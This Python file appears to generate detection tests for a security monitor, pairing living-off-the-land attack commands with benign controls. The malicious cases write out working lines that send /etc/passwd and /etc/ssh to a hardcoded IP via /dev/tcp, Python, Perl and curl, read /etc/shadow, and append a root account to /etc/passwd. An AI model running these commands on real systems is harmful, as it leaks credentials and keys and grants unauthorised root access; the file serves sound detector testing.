"""
CAT 4 — Living-off-the-land binary (LOLBin) abuse.

dd, gdb, awk, find, env -i, python -c, perl -e, sed used as malware.
Every malicious test has a paired benign legitimate-use variant.
"""

C2 = "135.181.79.27"


def gen():
    tests = []
    i = 0

    # ============ dd as exfil ============
    for variant in range(15):
        i += 1
        tests.append({
            "id": f"LOL-DD-{i:04d}",
            "category": "LOL",
            "subcategory": "dd_exfil",
            "malicious": True,
            "desc": f"dd reads sensitive file, writes to socket v{variant}",
            "cmd": (
                f"exec 3<>/dev/tcp/{C2}/14400 2>/dev/null; "
                f"dd if=/etc/passwd of=/dev/fd/3 bs=1024 count=2 2>/dev/null; "
                f"exec 3<&-; true"
            ),
            "expect_rule": r"binary_runs_from_tmp|exfil|cred",
            "detector": "rules.proc",
            "window": 6,
        })

    # ============ gdb script-mode as in-process exec ============
    for variant in range(15):
        i += 1
        tests.append({
            "id": f"LOL-GDB-{i:04d}",
            "category": "LOL",
            "subcategory": "gdb_script_exec",
            "malicious": True,
            "desc": f"gdb -batch -ex 'shell evil' v{variant}",
            "cmd": (
                f"gdb -batch -ex 'shell echo lolbin_{variant} > /tmp/.lol_{variant}' "
                f"-ex 'quit' /bin/true 2>/dev/null; "
                f"cat /tmp/.lol_{variant} >/dev/null 2>&1; rm -f /tmp/.lol_{variant}; true"
            ),
            "expect_rule": r"any_ptrace|gdb|web_server_spawns",
            "detector": "ebpf.proc",
            "window": 6,
        })

    # ============ awk inline malware ============
    for variant in range(15):
        i += 1
        tests.append({
            "id": f"LOL-AWK-{i:04d}",
            "category": "LOL",
            "subcategory": "awk_inline",
            "malicious": True,
            "desc": f"awk reads sensitive + system() exec v{variant}",
            "cmd": (
                f"awk 'BEGIN{{ "
                f"while ((getline ln < \"/etc/passwd\") > 0) {{}} "
                f"system(\"echo awk_{variant}\"); "
                f"close(\"/etc/passwd\")"
                f"}}' 2>/dev/null; true"
            ),
            "expect_rule": r"web_server_spawns|cred_proc_scrape",
            "detector": "rules.proc",
            "window": 6,
        })

    # ============ find -exec chains ============
    for variant in range(15):
        i += 1
        tests.append({
            "id": f"LOL-FIND-{i:04d}",
            "category": "LOL",
            "subcategory": "find_exec_chain",
            "malicious": True,
            "desc": f"find /etc -name passwd -exec cat v{variant}",
            "cmd": f"find /etc -maxdepth 1 -name 'passw*' -exec cat {{}} \\; >/dev/null 2>&1; true",
            "expect_rule": r"tamper_passwd|cred|fim",
            "detector": "fim",
            "window": 8,
        })

    # ============ env -i for argv-clean execution ============
    for variant in range(10):
        i += 1
        tests.append({
            "id": f"LOL-ENV-{i:04d}",
            "category": "LOL",
            "subcategory": "env_i_exec",
            "malicious": True,
            "desc": f"env -i to clear LD_PRELOAD/PATH v{variant}",
            "cmd": f"env -i /bin/sh -c 'cat /etc/shadow' >/dev/null 2>&1; true",
            "expect_rule": r"tamper_shadow|cred_proc_scrape",
            "detector": "rules.proc",
            "window": 6,
        })

    # ============ python -c inline malware ============
    for variant in range(15):
        i += 1
        tests.append({
            "id": f"LOL-PY-{i:04d}",
            "category": "LOL",
            "subcategory": "python_inline",
            "malicious": True,
            "desc": f"python -c inline backdoor v{variant}",
            "cmd": (
                f"python3 -c \"import socket,os; "
                f"s=socket.socket(); s.connect(('{C2}', 14400)); "
                f"d=open('/etc/passwd').read(); s.sendall(d.encode()); s.close()\" 2>/dev/null; true"
            ),
            "expect_rule": r"suspicious_interpreter_network|shell_with_socket",
            "detector": "rules.proc",
            "window": 6,
        })

    # ============ perl -e inline ============
    for variant in range(10):
        i += 1
        tests.append({
            "id": f"LOL-PERL-{i:04d}",
            "category": "LOL",
            "subcategory": "perl_inline",
            "malicious": True,
            "desc": f"perl -e inline backdoor v{variant}",
            "cmd": (
                f"perl -e 'use IO::Socket; my $s=IO::Socket::INET->new(\"{C2}:14400\"); "
                f"if($s){{ open my $f, \"<\", \"/etc/passwd\"; while(<$f>){{print $s $_}}; close $f; close $s }}' 2>/dev/null; true"
            ),
            "expect_rule": r"suspicious_interpreter_network|shell_with_socket",
            "detector": "rules.proc",
            "window": 6,
        })

    # ============ sed in-place evil ============
    for variant in range(10):
        i += 1
        tests.append({
            "id": f"LOL-SED-{i:04d}",
            "category": "LOL",
            "subcategory": "sed_inplace",
            "malicious": True,
            "desc": f"sed -i appending to /etc/passwd v{variant}",
            "cmd": (
                f"cp /etc/passwd /tmp/.pwd_{variant}; "
                f"sed -i '$a evil:x:0:0::/root:/bin/bash' /etc/passwd 2>/dev/null; "
                f"sleep 1; cp /tmp/.pwd_{variant} /etc/passwd; rm -f /tmp/.pwd_{variant}; true"
            ),
            "expect_rule": r"tamper_passwd",
            "detector": "fim",
            "window": 30,
        })

    # ============ tar exfil ============
    for variant in range(10):
        i += 1
        tests.append({
            "id": f"LOL-TAR-{i:04d}",
            "category": "LOL",
            "subcategory": "tar_exfil",
            "malicious": True,
            "desc": f"tar /etc to socket v{variant}",
            "cmd": (
                f"tar czf - /etc/ssh 2>/dev/null | "
                f"timeout 3 curl -s -X POST --data-binary @- http://{C2}:14400/t-{variant} >/dev/null 2>&1; true"
            ),
            "expect_rule": r"exfil|outbound",
            "detector": "rules.proc",
            "window": 6,
        })

    # ============ base64 obfuscated download-run ============
    for variant in range(10):
        i += 1
        b64_payload = "ZWNobyBoZWxsbw=="  # echo hello
        tests.append({
            "id": f"LOL-B64-{i:04d}",
            "category": "LOL",
            "subcategory": "base64_decode_exec",
            "malicious": True,
            "desc": f"base64 -d | sh execution v{variant}",
            "cmd": f"echo '{b64_payload}' | base64 -d | sh 2>/dev/null; true",
            "expect_rule": r"download_then_run|web_server_spawns",
            "detector": "rules.proc",
            "window": 6,
        })

    # ============ BENIGN CONTROLS ============
    # Each LOLBin has legit uses. Test that xhelix doesn't FP on them.

    # B1: legit dd backup
    for variant in range(5):
        i += 1
        tests.append({
            "id": f"LOL-B-{i:04d}",
            "category": "LOL",
            "subcategory": "benign_dd_backup",
            "malicious": False,
            "desc": f"benign: dd /etc/hostname /tmp v{variant}",
            "cmd": f"dd if=/etc/hostname of=/tmp/.bak{variant} bs=1024 count=1 2>/dev/null; rm -f /tmp/.bak{variant}; true",
            "expect_rule": r"(?!.*)",
            "detector": "control",
            "window": 5,
        })

    # B2: legit gdb info threads (no shell)
    for variant in range(5):
        i += 1
        tests.append({
            "id": f"LOL-B-{i:04d}",
            "category": "LOL",
            "subcategory": "benign_gdb_inspect",
            "malicious": False,
            "desc": f"benign: gdb info threads v{variant}",
            "cmd": "(sleep 30) & VPID=$!; sleep 0.5; gdb -p $VPID -batch -ex 'info threads' -ex 'detach' -ex 'quit' 2>/dev/null; kill $VPID 2>/dev/null; true",
            "expect_rule": r"(?!.*)",
            "detector": "control",
            "window": 6,
        })

    # B3: legit awk text processing
    for variant in range(5):
        i += 1
        tests.append({
            "id": f"LOL-B-{i:04d}",
            "category": "LOL",
            "subcategory": "benign_awk_text",
            "malicious": False,
            "desc": f"benign: awk count lines v{variant}",
            "cmd": "awk 'END {print NR}' /etc/hostname >/dev/null; true",
            "expect_rule": r"(?!.*)",
            "detector": "control",
            "window": 5,
        })

    # B4: legit find
    for variant in range(5):
        i += 1
        tests.append({
            "id": f"LOL-B-{i:04d}",
            "category": "LOL",
            "subcategory": "benign_find",
            "malicious": False,
            "desc": f"benign: find /tmp -mtime +1 v{variant}",
            "cmd": "find /tmp -maxdepth 1 -mtime +1 2>/dev/null | head -3 >/dev/null; true",
            "expect_rule": r"(?!.*)",
            "detector": "control",
            "window": 5,
        })

    # B5: legit python script
    for variant in range(5):
        i += 1
        tests.append({
            "id": f"LOL-B-{i:04d}",
            "category": "LOL",
            "subcategory": "benign_python_script",
            "malicious": False,
            "desc": f"benign: python -c print v{variant}",
            "cmd": "python3 -c 'print(1+1)' >/dev/null; true",
            "expect_rule": r"(?!.*)",
            "detector": "control",
            "window": 5,
        })

    # B6: legit perl
    for variant in range(5):
        i += 1
        tests.append({
            "id": f"LOL-B-{i:04d}",
            "category": "LOL",
            "subcategory": "benign_perl_script",
            "malicious": False,
            "desc": f"benign: perl -e print v{variant}",
            "cmd": "perl -e 'print 2+2' >/dev/null 2>&1; true",
            "expect_rule": r"(?!.*)",
            "detector": "control",
            "window": 5,
        })

    return tests


if __name__ == "__main__":
    t = gen()
    print(f"CAT 4 LOL: {len(t)} tests")
    from collections import Counter
    by_sub = Counter(x["subcategory"] for x in t)
    for sub, n in by_sub.most_common():
        print(f"  {sub:<28} {n}")
    mal = sum(1 for x in t if x["malicious"])
    ben = sum(1 for x in t if not x["malicious"])
    print(f"  malicious: {mal}, benign: {ben}")
